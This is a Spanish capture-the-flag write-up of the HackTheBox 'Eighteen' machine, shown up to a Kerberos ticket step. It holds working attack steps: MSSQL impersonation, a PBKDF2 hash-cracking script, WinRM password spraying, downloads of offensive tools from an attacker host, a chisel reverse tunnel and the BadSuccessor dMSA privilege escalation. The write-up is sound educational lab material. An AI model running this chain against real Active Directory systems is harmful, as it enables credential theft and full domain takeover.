Empezamos la máquina con unas credenciales: `As is common in real life Windows penetration tests, you will start the Eighteen box with credentials for the following account: kevin / iNa2we6haRj2gaw!`. 

---

### 1. Enumeración inicial

Vamos a escanear los puertos abiertos con **nmap** en busca de servicios donde nos puedan servir las credenciales:

```bash
sudo nmap -p- --open --min-rate 5000 -vvv -n -Pn 10.10.11.95 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.98 ( https://nmap.org ) at 2025-11-17 17:35 +0000
Initiating SYN Stealth Scan at 17:35
Scanning 10.10.11.95 [65535 ports]
Discovered open port 5985/tcp on 10.10.11.95
Discovered open port 1433/tcp on 10.10.11.95
Completed SYN Stealth Scan at 17:36, 26.42s elapsed (65535 total ports)
Nmap scan report for 10.10.11.95
Host is up, received user-set (0.075s latency).
Scanned at 2025-11-17 17:35:44 WET for 27s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE  REASON
1433/tcp open  ms-sql-s syn-ack ttl 127
5985/tcp open  wsman    syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.51 seconds
           Raw packets sent: 131074 (5.767MB) | Rcvd: 8 (352B)
```

Le mandamos un escaneo más exhaustivo sobre los puertos abiertos con diversos scripts de reconocimiento que trae nmap, ya de paso le añadiré el puerto 80 que no lo reportó abierto aunque si es accesible:

```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.11.95
	[*] Open ports: 1433,5985

[*] Ports copied to clipboard with wl-copy

❯ sudo nmap -sCV -p80,1433,5985 10.10.11.95
Starting Nmap 7.98 ( https://nmap.org ) at 2025-11-17 17:37 +0000
Nmap scan report for eighteen.htb (10.10.11.95)
Host is up (0.071s latency).

PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
|_http-title: Welcome - eighteen.htb
|_http-server-header: Microsoft-IIS/10.0
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.10.11.95:1433: 
|     Target_Name: EIGHTEEN
|     NetBIOS_Domain_Name: EIGHTEEN
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: eighteen.htb
|     DNS_Computer_Name: DC01.eighteen.htb
|     DNS_Tree_Name: eighteen.htb
|_    Product_Version: 10.0.26100
|_ssl-date: 2025-11-18T00:37:45+00:00; +7h00m00s from scanner time.
| ms-sql-info: 
|   10.10.11.95:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-11-17T23:47:47
|_Not valid after:  2055-11-17T23:47:47
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.26 seconds
```

Vemos un **MSSQL** por el puerto **1433**, un **WinRM** en el puerto **5985**, el cuál es un protocolo similar a SSH para máquinas Windows que usa autenticación por AD y que solo pueden usar los usuarios añadidos al grupo **Remote Management Users**.

---
### 2. Enumeración del servicio MSSQL

Lo primero que haremos es enumerar un poco de información básica sobre el servicio de mssql con la herramienta **netexec** usando las credenciales anteriores:

```bash
nxc mssql 10.10.11.95 -u 'kevin' -p 'iNa2we6haRj2gaw!' --local-auth
MSSQL       10.10.11.95     1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb)
MSSQL       10.10.11.95     1433   DC01             [+] DC01\kevin:iNa2we6haRj2gaw! 
```

Estamos ante un posible **Windows 11/Server 2025**, el dominio `eighteen.htb` lo añadimos al **/etc/hosts**.

Procedemos a enumerar los usuarios existentes añadiendo la flag **--rid-brute** a la herramienta:

```bash
nxc mssql 10.10.11.95 -u 'kevin' -p 'iNa2we6haRj2gaw!' --local-auth --rid-brute
MSSQL       10.10.11.95     1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb)
MSSQL       10.10.11.95     1433   DC01             [+] DC01\kevin:iNa2we6haRj2gaw! 
MSSQL       10.10.11.95     1433   DC01             498: EIGHTEEN\Enterprise Read-only Domain Controllers
MSSQL       10.10.11.95     1433   DC01             500: EIGHTEEN\Administrator
MSSQL       10.10.11.95     1433   DC01             501: EIGHTEEN\Guest
MSSQL       10.10.11.95     1433   DC01             502: EIGHTEEN\krbtgt
MSSQL       10.10.11.95     1433   DC01             512: EIGHTEEN\Domain Admins
MSSQL       10.10.11.95     1433   DC01             513: EIGHTEEN\Domain Users
MSSQL       10.10.11.95     1433   DC01             514: EIGHTEEN\Domain Guests
MSSQL       10.10.11.95     1433   DC01             515: EIGHTEEN\Domain Computers
MSSQL       10.10.11.95     1433   DC01             516: EIGHTEEN\Domain Controllers
MSSQL       10.10.11.95     1433   DC01             517: EIGHTEEN\Cert Publishers
MSSQL       10.10.11.95     1433   DC01             518: EIGHTEEN\Schema Admins
MSSQL       10.10.11.95     1433   DC01             519: EIGHTEEN\Enterprise Admins
MSSQL       10.10.11.95     1433   DC01             520: EIGHTEEN\Group Policy Creator Owners
MSSQL       10.10.11.95     1433   DC01             521: EIGHTEEN\Read-only Domain Controllers
MSSQL       10.10.11.95     1433   DC01             522: EIGHTEEN\Cloneable Domain Controllers
MSSQL       10.10.11.95     1433   DC01             525: EIGHTEEN\Protected Users
MSSQL       10.10.11.95     1433   DC01             526: EIGHTEEN\Key Admins
MSSQL       10.10.11.95     1433   DC01             527: EIGHTEEN\Enterprise Key Admins
MSSQL       10.10.11.95     1433   DC01             528: EIGHTEEN\Forest Trust Accounts
MSSQL       10.10.11.95     1433   DC01             529: EIGHTEEN\External Trust Accounts
MSSQL       10.10.11.95     1433   DC01             553: EIGHTEEN\RAS and IAS Servers
MSSQL       10.10.11.95     1433   DC01             571: EIGHTEEN\Allowed RODC Password Replication Group
MSSQL       10.10.11.95     1433   DC01             572: EIGHTEEN\Denied RODC Password Replication Group
MSSQL       10.10.11.95     1433   DC01             1000: EIGHTEEN\DC01$
MSSQL       10.10.11.95     1433   DC01             1101: EIGHTEEN\DnsAdmins
MSSQL       10.10.11.95     1433   DC01             1102: EIGHTEEN\DnsUpdateProxy
MSSQL       10.10.11.95     1433   DC01             1601: EIGHTEEN\mssqlsvc
MSSQL       10.10.11.95     1433   DC01             1602: EIGHTEEN\SQLServer2005SQLBrowserUser$DC01
MSSQL       10.10.11.95     1433   DC01             1603: EIGHTEEN\HR
MSSQL       10.10.11.95     1433   DC01             1604: EIGHTEEN\IT
MSSQL       10.10.11.95     1433   DC01             1605: EIGHTEEN\Finance
MSSQL       10.10.11.95     1433   DC01             1606: EIGHTEEN\jamie.dunn
MSSQL       10.10.11.95     1433   DC01             1607: EIGHTEEN\jane.smith
MSSQL       10.10.11.95     1433   DC01             1608: EIGHTEEN\alice.jones
MSSQL       10.10.11.95     1433   DC01             1609: EIGHTEEN\adam.scott
MSSQL       10.10.11.95     1433   DC01             1610: EIGHTEEN\bob.brown
MSSQL       10.10.11.95     1433   DC01             1611: EIGHTEEN\carol.white
MSSQL       10.10.11.95     1433   DC01             1612: EIGHTEEN\dave.green
```

Los usuarios nos los guardamos por el momento en un fichero `users.txt`:

```bash
kevin
Administrator
Guest
krbtgt
DC01$
mssqlsvc
jamie.dunn
jane.smith
alice.jones   
adam.scott
bob.brown
carol.white
dave.green
```

Ahora nos conectamos con el conjunto de herramientas **impacket** a la base de datos mssql con las credenciales que ya tenemos de kevin, especificando el dominio:

```bash
mssqlclient.py 'EIGHTEEN.HTB/kevin:iNa2we6haRj2gaw!@10.10.11.95'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (kevin  guest@master)> 
```

Lo primero que vamos a hacer es comprobar si tenemos ejecución de comandos, o si la podemos habilitar:

```sql
SQL (kevin  guest@master)> xp_cmdshell "whoami"
ERROR(DC01): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
SQL (kevin  guest@master)> enable_xp_cmdshell
ERROR(DC01): Line 105: User does not have permission to perform this action.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(DC01): Line 105: User does not have permission to perform this action.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
```

No podemos, también podemos probar a habilitarlo de forma alternativa, en vez de con `enable_xp_cmdshell` lo podemos hacer de forma más manual, igual nos toparemos con el mismo mensaje de error.

```sql
SQL (kevin  guest@master)> EXEC sp_configure 'show advanced options', 1
ERROR(DC01): Line 105: User does not have permission to perform this action.
SQL (kevin  guest@master)> RECONFIGURE
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
SQL (kevin  guest@master)> EXEC sp_configure 'xp_cmdshell', 1
ERROR(DC01): Line 105: User does not have permission to perform this action.
SQL (kevin  guest@master)> RECONFIGURE
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
```

Ahora vamos a intentar hacer un `ntlmv2 hash grabbing/stealing`, resumidamente vamos a robar el hash de `ntlmv2`, **obligando al usuario que ejecuta el servicio de mssql a que nos mande una petición a través del servidor samba a nuestro servicio smb malicioso**.

Levantamos el servicio samba malicioso con impacket en nuestra máquina:

```bash
sudo smbserver.py shared -smb2support $(pwd)
[sudo] contraseña para abra: 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
```

Nos mandamos la petición al servidor smb nuestro:

```bash
SQL (kevin  guest@master)> EXEC master..xp_dirtree '\\10.10.14.45\shared'
subdirectory   depth   
------------   -----   
SQL (kevin  guest@master)> 
```

Tampoco ha funcionado, la máquina tira por otra dirección. Vamos a ver si nuestro usuario actual es **sysadmin**, si sale 0 no lo somos, si sale 1 lo somos, de antes se puede suponer que no lo somos al no poder ejecutar comandos, igualmente lo comprobamos:

```sql
SQL (kevin  guest@master)> select IS_SRVROLEMEMBER('sysadmin')
    
-   
0   
```

Vamos a simplificar el vector de ataque y a proceder con **enumeración de las bases de datos, tablas y columnas** en busca de información sensible o que nos pueda ayudar a vulnerar la máquina:

```sql
SQL (kevin  guest@master)> select name from master.dbo.sysdatabases
name                
-----------------   
master              
tempdb              
model               
msdb                
financial_planner
```

De las bases de datos, solo nos interesa **financial_planner**, el resto son bases de datos genéricas/comunes en instalaciones de mssql, algo similar a `information_schema` en mysql.

```sql
SQL (kevin  guest@master)> select table_name from financial_planner.information_schema.tables
ERROR(DC01): Line 1: The server principal "kevin" is not able to access the database "financial_planner" under the current security context.
```

Vemos que nuestro usuario no tiene acceso a la base de datos `financial_planner`. Procederé a **listar otros servidores mssql linkeados al principal** (al que nos encontramos ahora mismo). Si hay alguno linkeado accederemos a este y haremos las mismas comprobaciones anteriores para tratar de escalar permisos o ejecutar comandos:

```sql
SQL (kevin  guest@master)> select srvname, isremote from sysservers
srvname   isremote   
-------   --------   
DC01             1   
```

Nos sale `isremote 1` en un servidor mssql pero es el mismo servidor en el que ya nos encontramos, DC01. 

---
### 3. Impersonamiento de usuario appdev en MSSQL

El enfoque correcto en esta máquina es ver si podemos **impersonar a otro usuario**, hacernos pasar por un usuario existente, en términos más simples es loguearse con un usuario a través de uno al que ya tengamos acceso (`kevin`), si es que kevin tiene permisos para hacerlo. 

Lo primero es ver a que usuarios tiene `kevin` permisos para `impersonar`:

```sql
SQL (kevin  guest@master)> SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
name     
------   
appdev   
```

Podemos impersonar al usuario `appdev`. Para impersonarlo es añadirle esta orden al inicio de la consulta SQL para ejecutarla con el usuario `appdev` en lugar de con `kevin`:

```sql
EXECUTE AS LOGIN = 'appdev' 
```

Entonces hacemos todas las comprobaciones anteriores, y descubrimos que `appdev` si puede enumerar la base de datos `financial_planner`:

```sql
SQL (kevin  guest@master)> EXECUTE AS LOGIN = 'appdev' select table_name from financial_planner.information_schema.tables
table_name    
-----------   
users         
incomes       
expenses      
allocations   
analytics     
visits 
```

La tabla `users` se ve interesante, vamos a enumerarla:

```sql
SQL (appdev  appdev@financial_planner)> EXECUTE AS LOGIN = 'appdev' USE financial_planner

SQL (appdev  appdev@financial_planner)> EXECUTE AS LOGIN = 'appdev' SELECT * FROM Users
  id   full_name   username   email                password_hash                                                                                            is_admin   created_at   
----   ---------   --------   ------------------   ------------------------------------------------------------------------------------------------------   --------   ----------   
1002   admin       admin      admin@eighteen.htb   pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133          1   2025-10-29 05:39:03   
1005   black       black      black@hotmail.com    pbkdf2:sha256:600000$Reay94olXKhMrHLd$13366132e6f751865b3e64db228b8f38ede0e5da76fe02cd98555606f580b4a8          0   2025-11-17 17:02:29   
```

Disponemos de credenciales hasheadas para `admin`, el usuario black es otro usuario que está realizando la máquina.

La herramienta **john** me está dando algunos problemas con este hash, vamos a pasarle todo el hash completo a la IA, y pedirle que monte un script en python usando mi ruta local del diccionario `rockyou.txt` para crackear la contraseña:

```python
import hashlib
import base64

def crack_pbkdf2_hash(target_hash, wordlist_path):
    """
    Crack a PBKDF2-SHA256 hash using a wordlist
    Format: pbkdf2:sha256:iterations$salt$hash
    """
    try:
        # Parse the target hash
        if target_hash.startswith('pbkdf2:sha256:'):
            hash_parts = target_hash.replace('pbkdf2:sha256:', '').split('$')
        else:
            hash_parts = target_hash.split('$')
        
        if len(hash_parts) != 3:
            print("Invalid hash format. Expected: pbkdf2:sha256:iterations$salt$hash")
            return False
        
        iterations = int(hash_parts[0])
        salt = hash_parts[1]
        target_digest = bytes.fromhex(hash_parts[2])
        
        print(f"Target: {target_hash}")
        print(f"Iterations: {iterations}")
        print(f"Salt: {salt}")
        print(f"Hash: {hash_parts[2]}")
        print("Starting dictionary attack...")
        
        # Try passwords from wordlist
        with open(wordlist_path, 'r', errors='ignore') as f:
            for line_num, password in enumerate(f, 1):
                password = password.strip()
                if not password:
                    continue
                
                # Generate hash for current password
                try:
                    derived_key = hashlib.pbkdf2_hmac(
                        'sha256',
                        password.encode('utf-8'),
                        salt.encode('utf-8'),
                        iterations
                    )
                except Exception as e:
                    continue
                
                # Compare with target
                if derived_key == target_digest:
                    print(f"\n[SUCCESS] Password found!")
                    print(f"Password: {password}")
                    print(f"Found at line: {line_num}")
                    return password
                
                # Progress indicator
                if line_num % 10000 == 0:
                    print(f"Attempted {line_num} passwords...")
        
        print("\n[FAILURE] Password not found in wordlist")
        return None
        
    except Exception as e:
        print(f"Error: {e}")
        return None

if __name__ == "__main__":
    target_hash = "pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133"
    wordlist_path = "/home/abra/Documentos/rockyou.txt"
    
    print("PBKDF2-SHA256 Hash Cracker")
    print("=" * 40)
    
    result = crack_pbkdf2_hash(target_hash, wordlist_path)
    
    if result:
        print(f"\nCracking successful!")
        print(f"The password is: {result}")
    else:
        print("\nCracking failed. Password not found.")
```

Ejecutamos el script para crackear el hash:

```bash
python3 crack.py
PBKDF2-SHA256 Hash Cracker
========================================
Target: pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133
Iterations: 600000
Salt: AMtzteQIG7yAbZIa
Hash: 0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133
Starting dictionary attack...

[SUCCESS] Password found!
Password: iloveyou1
Found at line: 234

Cracking successful!
The password is: iloveyou1
```

---
### 4. Acceso WinRM y User Flag

Tenemos las credenciales `admin:iloveyou1`, estas sirven para el sitio web que tiene la máquina, pero es un rabbit-hole, un poco raro que una máquina de dificultad easy tenga rabbit-holes.

Vamos a probar la contraseña **con todos los usuarios de mssql que enumeramos antes, por el winrm que tiene expuesto la máquina.** En muchas máquinas se suele hacer este procedimiento por el servidor Samba, cosa que no hay en esta:

```bash
nxc winrm 10.10.11.95 -u users.txt -p 'iloveyou1'
WINRM       10.10.11.95     5985   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb)
WINRM       10.10.11.95     5985   DC01             [-] eighteen.htb\kevin:iloveyou1
WINRM       10.10.11.95     5985   DC01             [-] eighteen.htb\Administrator:iloveyou1
WINRM       10.10.11.95     5985   DC01             [-] eighteen.htb\Guest:iloveyou1
WINRM       10.10.11.95     5985   DC01             [-] eighteen.htb\krbtgt:iloveyou1
WINRM       10.10.11.95     5985   DC01             [-] eighteen.htb\DC01$:iloveyou1
WINRM       10.10.11.95     5985   DC01             [-] eighteen.htb\mssqlsvc:iloveyou1
WINRM       10.10.11.95     5985   DC01             [-] eighteen.htb\jamie.dunn:iloveyou1
WINRM       10.10.11.95     5985   DC01             [-] eighteen.htb\jane.smith:iloveyou1
WINRM       10.10.11.95     5985   DC01             [-] eighteen.htb\alice.jones:iloveyou1
WINRM       10.10.11.95     5985   DC01             [+] eighteen.htb\adam.scott:iloveyou1 (Pwn3d!)
```

Tenemos un usuario que usa estas credenciales: `adam.scott:iloveyou1`. Nos podemos tratar de conectar al servicio winrm con dichas credenciales, usando el siguiente script:

[https://github.com/ozelis/winrmexec/blob/main/winrmexec.py](https://github.com/ozelis/winrmexec/blob/main/winrmexec.py "https://github.com/ozelis/winrmexec/blob/main/winrmexec.py")

```bash
python3 evil-winrm.py 'adam.scott:iloveyou1@10.10.11.95'
'prompt_toolkit' not installed, using built-in 'readline'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] '-target_ip' not specified, using 10.10.11.95
[*] '-port' not specified, using 5985
[*] '-url' not specified, using http://10.10.11.95:5985/wsman
PS C:\Users\adam.scott\Documents> 
```

Tenemos acceso a la máquina **y a la user flag** en el desktop del usuario, ahora toca ir a por la root flag.

---
### 5. Enumeración del entorno y escalada de privilegios (BadSuccessor)

Comenzaremos enumerando la versión de Windows que se está usando:

```bash
PS C:\Users\adam.scott\Desktop> Get-ComputerInfo | select WindowsProductName, WindowsVersion, OsHardwareAbstractionLayer

WindowsProductName             WindowsVersion OsHardwareAbstractionLayer
------------------             -------------- --------------------------
Windows Server 2025 Datacenter 2009   
```

La versión 2009 de Windows Server 2025 Datacenter es vulnerable a **BadSuccessor**.

Preparativos para explotar la vulnerabilidad:

Primero vamos a verificar los permisos de nuestro usuario actual, para ello vamos a bajarnos el script **PowerView.ps1** para poder enumerar el entorno Windows con más detalle desde la PowerShell:

https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

Nos descargamos el script en nuestra máquina, abrimos un server de Python por el puerto 4444, y usamos un comando equivalente a **wget** en la máquina windows para descargar el fichero de nuestra máquina a la víctima:

```bash
Invoke-WebRequest http://10.10.14.45:4444/PowerView.ps1 -OutFile PowerView.ps1 -UseBasicParsing
```

Importamos en la sesión de PowerShell el script:

```powershell
PS C:\Users\adam.scott\Desktop> Import-Module .\PowerView.ps1
```

La idea es, si nuestro usuario adam.scott tiene el permiso **CreateChild sobre una OU**, podremos crear un delegated Managed Service Accounts (**dMSA**, una característica especifica de Windows Server 2025) dentro de ella y manipularlo para **heredar los privilegios de cualquier cuenta del dominio**, incluyendo Domain Admins.

El comando ``Find-InterestingDomainAcl`` de PowerView enumera todas las **ACLs (Access Control Lists)** del dominio y filtra únicamente las que considera **interesantes desde el punto de vista ofensivo**.

```powershell
PS C:\Users\adam.scott\Desktop> Find-InterestingDomainAcl

ObjectDN                : OU=Staff,DC=eighteen,DC=htb
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : CreateChild
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-1152179935-589108180-1989892463-1604
IdentityReferenceName   : IT
IdentityReferenceDomain : eighteen.htb
IdentityReferenceDN     : CN=IT,OU=Staff,DC=eighteen,DC=htb
IdentityReferenceClass  : group
```

El grupo **IT** tiene permiso de **CreateChild** sobre la OU `Staff`, tiene permiso `CreateChild` por lo que **puede crear objetos hijo dentro de esa OU** (usuarios, equipos, cuentas de servicio...), y por último `ObjectAceType: None` significa que puede crear **cualquier tipo de objeto**, no solo uno específico.

Vamos a comprobar si de casualidad nuestro usuario pertenece a dicho grupo:

```powershell
PS C:\Users\adam.scott\Desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
EIGHTEEN\IT                                Group            S-1-5-21-1152179935-589108180-1989892463-1604 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
```

**Adam pertenece al grupo IT, y con dicho grupo puede crear un `dMSA` en `OU=Staff` que podemos manipular para heredar privilegios.**

En la máquina Windows, tiene que estar el fichero `.ps1` de BadSuccessor que se encuentra en este enlace de GitHub: 
https://github.com/b5null/Invoke-BadSuccessor.ps1/blob/main/Invoke-BadSuccessor.ps1

Lo ponemos en el Desktop de `adam.scott`:

En nuestra máquina bajamos el fichero malicioso `.ps1` del enlace de GitHub, abrimos un server de Python por el puerto 4444, y descargamos el fichero de nuestra máquina a la víctima:

```bash
Invoke-WebRequest http://10.10.14.45:4444/Invoke-BadSuccessor.ps1 -OutFile Invoke-BadSuccessor.ps1 -UseBasicParsing
```

Necesitamos la herramienta **chisel** para que nuestra máquina de atacante pueda ver el **Domain Controller** de Active Directory desde la máquina víctima, ya que de por si no podemos verlo desde nuestra máquina, necesitamos un túnel.
https://github.com/jpillora/chisel/releases/tag/v1.11.3

Nos bajamos del repositorio `chisel_1.11.3_windows_amd64.zip` y `chisel_1.11.3_linux_amd64.gz` en nuestra máquina.

En nuestra máquina (en mi caso Arch Linux), extraemos el fichero de chisel y le damos permisos de ejecución:

```bash
gunzip chisel_1.11.3_linux_amd64.gz

chmod +x chisel_1.11.3_linux_amd64
```

En nuestra máquina abrimos el **servidor** de chisel por el puerto 8888:

```bash
./chisel_1.11.3_linux_amd64 server -p 8888 --reverse
2025/11/17 13:28:00 server: Reverse tunnelling enabled
2025/11/17 13:28:00 server: Fingerprint EjgHQVKvXEIKP73keTDF+/1zQguOs/fuu8eLc5st8Fk=
2025/11/17 13:28:00 server: Listening on http://0.0.0.0:8888
```

Extraemos en otra terminal el fichero `chisel_1.11.3_windows_amd64.zip` y subimos el fichero `chisel.exe` a la máquina Windows:

```bash
unzip chisel_1.11.3_windows_amd64.zip
Archive:  chisel_1.11.3_windows_amd64.zip
  inflating: chisel.exe    
```

Abrimos el servidor de Python nuevamente por el puerto 4444 y nos bajamos el fichero en la máquina Windows:

```powershell
Invoke-WebRequest http://10.10.14.45:4444/chisel.exe -OutFile chisel.exe -UseBasicParsing
```

Lo ejecutamos en **modo cliente:**

```powershell
PS C:\Users\adam.scott\Desktop> .\chisel.exe client 10.10.14.45:8888 R:socks
chisel.exe : 2025/11/17 13:30:55 client: Connecting to ws://10.10.14.45:8888
    + CategoryInfo          : NotSpecified: (2025/11/17 13:0....10.14.45:8888:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
2025/11/17 13:30:58 client: Connected (Latency 265.2245ms)
```

Importamos el módulo de BadSuccesor en la consola PowerShell:

```powershell
PS C:\Users\adam.scott\Desktop> Import-Module .\Invoke-BadSuccessor.ps1
```

Lo ejecutamos:

```powershell
PS C:\Users\adam.scott\Desktop> Invoke-BadSuccessor
[+] Created computer 'Pwn' in 'OU=Staff,DC=eighteen,DC=htb'.                                                                                                                             
[+] Machine Account's sAMAccountName : Pwn$                                                                                                                                              
[+] Machine Account's SID             : S-1-5-21-1152179935-589108180-1989892463-12601                                                                                                   
                                                                                                                                                                                         
[+] Created delegated service account 'attacker_dMSA' in 'OU=Staff,DC=eighteen,DC=htb'.                                                                                                  
[+] Service Account's sAMAccountName : attacker_dMSA$                                                                                                                                    
[+] Service Account's SID             : S-1-5-21-1152179935-589108180-1989892463-12602
[+] Allowed to retrieve password      : Pwn$

[+] Added ACE on 'CN=attacker_dMSA,OU=Staff,DC=eighteen,DC=htb' for 'adam.scott' (S-1-5-21-1152179935-589108180-1989892463-1609) with rights 'All' (Allow, ThisObjectOnly).
[+] Granted 'GenericAll' on 'attacker_dMSA$' to 'adam.scott'.
[+] Configured delegated MSA state for 'attacker_dMSA$' with predecessor:
    CN=Administrator,CN=Users,DC=eighteen,DC=htb

[+] Next steps (Rubeus):
    Rubeus.exe hash /password:'Password123!' /user:Pwn$ /domain:eighteen.htb
    Rubeus.exe asktgt /user:Pwn$ /aes256:<AES256KEY> /domain:eighteen.htb
    Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/eighteen.htb /dmsa /opsec /ptt /nowrap /outfile:ticket.kirbi /ticket:<BASE64TGT>

[+] Alternative (Impacket):
    getST.py 'eighteen.htb/Pwn$:Password123!' -k -no-pass -dmsa -self -impersonate 'attacker_dMSA$'
```

Este script ha creado **una cuenta de equipo `Pwn$`  en la OU `Staff` donde tenemos CreateChild con contraseña `Password123!`**. Creó un **delegated Managed Service Account** en la misma OU llamado `attacker_dMSA$` y le dió permisos a `Pwn$` para recuperar las credenciales del nuevo dMSA.

A continuación el script **da permisos `GenericAll` a adam.scott sobre el dMSA**, control total sobre ese objeto. Por último configura el atributo `msDS-ManagedAccountPrecededByLink` del dMSA **apuntando al Administrator del dominio**. Esto le dice a AD que este dMSA es el sucesor del Administrator, **por tanto hereda sus privilegios**.

Windows Server 2025 introdujo los dMSA precisamente para reemplazar cuentas de servicio antiguas de forma ordenada. El problema es que **no valida si tienes permiso sobre la cuenta predecesora, solo sobre la OU donde creas el dMSA.** Esa es la vulnerabilidad.

---
### 6. Obtención del hash de Administrator y Root Flag

Ahora necesitamos desactivar la sincronización automática de la fecha/hora de nuestro equipo y sincronizar la hora de nuestra máquina atacante con la del dominio AD, de lo contrario nos vamos a encontrar con errores:

```bash
sudo timedatectl set-ntp false
sudo ntpdate 10.10.11.95
```

Usamos **proxychains** para conectar desde nuestra máquina de atacante con el Domain Controller a través de la máquina víctima, y **vamos a obtener el Granting Ticket de Kerberos a través de las credenciales del dMSA y suplantando su identidad:**

```bash
proxychains impacket-getST 'eighteen.htb/Pwn$:Password123!' -k -no-pass -dmsa -self -impersonate 'attacker_dMSA$'

[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  EIGHTEEN.HTB:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  EIGHTEEN.HTB:88  ...  OK
[*] Impersonating attacker_dMSA$
[*] Requesting S4U2self
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.7.197:88  ...  OK
[*] Current keys:
[*] EncryptionTypes.aes256_cts_hmac_sha1_96:82213b9d49ff5d8a7410f5298b9641d10b12d1b0140a2f02e916059ff9589055
[*] EncryptionTypes.rc4_hmac:159cd59d4d328fafa1ae07eb3b00181c
[*] Previous keys:
[*] EncryptionTypes.rc4_hmac:0b133be956bfaddf9cea56701affddec
[*] Saving ticket in attacker_dMSA$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache
```

Nos ha creado un fichero `.ccache` en nuestro directorio de trabajo actual. Vamos a referenciarlo en la variable `KRB5CCNAME` para que la herramienta `impacket-secretsdump` la use a continuación:

```bash
KRB5CCNAME=./'attacker_dMSA$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache' 
